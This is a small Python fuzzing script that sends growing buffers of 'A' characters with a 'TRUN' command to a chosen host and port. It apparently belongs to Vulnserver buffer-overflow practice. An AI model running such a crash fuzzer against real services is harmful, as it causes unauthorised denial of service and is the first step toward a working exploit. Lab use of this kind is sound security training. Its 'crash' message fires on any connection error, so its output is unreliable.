##by Doneffes
import socket, os, sys, argparse

parser = argparse.ArgumentParser("Fuzzing")
parser.add_argument("-u", help="'ip'", required="true")
parser.add_argument("-p", help ="port", default=9999, type=int)
parser.add_argument("-s", help ="Loop size", type=int, default=5000)
parser.add_argument("-c", help ="Command, TRUN /.:/ default", default = 'TRUN /.:/')
parser.add_argument("-r", help ="Rate",type=int, default = 5)

rate = vars(parser.parse_args())["r"]
size = vars(parser.parse_args())["s"]
host = vars(parser.parse_args())["u"]
port = vars(parser.parse_args())["p"]
command = vars(parser.parse_args())["c"]

for factor in range(1,size,rate):

    try:
        print("[",factor," bytes]")
        sock_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_c.connect((host,port))
        sock_c.send(bytes(command + "A"*factor,'ascii'))
        #print( repr(sock_c.recv(1024)) )
        sock_c.close()
    
    except:
        print("crash")
        exit()
    
